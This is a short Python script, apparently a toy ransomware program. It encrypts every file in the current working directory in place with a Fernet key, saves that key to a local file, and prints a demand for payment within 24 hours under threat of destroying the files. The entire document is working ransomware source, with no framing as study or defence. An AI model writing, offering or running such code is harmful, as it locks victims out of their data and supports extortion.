import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "encrypt_file.py" or file == 'env' or file == "thekey.key" or file == "decrypt_file.py":
        continue
    files.append(file)

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)

print('all your file has been encrypted, send me money in 24 hour or your file will destroy!')
